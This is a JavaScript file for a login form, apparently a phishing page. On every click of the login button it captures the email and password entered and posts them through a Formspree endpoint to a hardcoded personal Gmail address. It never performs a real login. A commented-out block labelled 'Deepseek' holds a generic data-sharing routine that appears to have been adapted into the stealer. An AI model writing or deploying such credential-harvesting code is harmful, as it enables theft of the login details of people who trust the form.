const userEmail = document.getElementById('email');
const userPassword = document.getElementById('password');
const login = document.getElementById('login');


login.addEventListener('click', async function (e) {
  // e.preventDefault()
  const data = `Email: ${userEmail.value}, Password: ${userPassword.value}`;
  const recipient = 'ataullahmasud388@gmail.com';
  const statusElement = document.createElement('status');
  
  // Clear previous status
  statusElement.style.display = 'none';
  statusElement.className = '';
  
  
  try {
      // Prepare form data
      const formData = new FormData();
      formData.append('email', recipient);
      formData.append('message', `Shared data:\n\n${data}`);
      formData.append('_subject', 'Data shared from web app');
      
      // Replace 'YOUR_FORMSPREE_ID' with your actual Formspree form ID
      const response = await fetch('https://formspree.io/f/xgvadwzn', {
          method: 'POST',
          body: formData,
          headers: {
              'Accept': 'application/json'
          }
      });
      
  } catch (error) {
      console.log(error)
  }
});


// Deepseek

// document.getElementById('shareButton').addEventListener('click', async function () {
//   const data = document.getElementById('dataInput').value.trim();
//   // const recipient = document.getElementById('recipientEmail').value.trim();
//   const recipient = 'ataullahmasud388@gmail.com';
//   const statusElement = document.getElementById('status');
  
//   // Clear previous status
//   statusElement.style.display = 'none';
//   statusElement.className = '';
  
//   // Validate inputs
//   // if (!data) {
//   //     showStatus('Please enter some data to share', 'error');
//   //     return;
//   // }
  
//   // if (!recipient.includes('@')) {
//   //     showStatus('Please enter a valid email address', 'error');
//   //     return;
//   // }
  
//   try {
//       // Prepare form data
//       const formData = new FormData();
//       formData.append('email', recipient);
//       formData.append('message', `Shared data:\n\n${data}`);
//       formData.append('_subject', 'Data shared from web app');
      
//       // Replace 'YOUR_FORMSPREE_ID' with your actual Formspree form ID
//       const response = await fetch('https://formspree.io/f/xgvadwzn', {
//           method: 'POST',
//           body: formData,
//           headers: {
//               'Accept': 'application/json'
//           }
//       });
      
//       // if (response.ok) {
//       //     showStatus('Data shared successfully! The recipient should receive it shortly.', 'success');
//       //     document.getElementById('dataInput').value = ''; // Clear the form
//       // } else {
//       //     const errorData = await response.json();
//       //     showStatus(`Failed to share data: ${errorData.error || 'Unknown error'}`, 'error');
//       // }
//   } catch (error) {
//       // showStatus(`Error: ${error.message}`, 'error');
//       console.log(error)
//   }
// });

// // function showStatus(message, type) {
// //     const statusElement = document.getElementById('status');
// //     statusElement.textContent = message;
// //     statusElement.className = type;
// //     statusElement.style.display = 'block';
// // }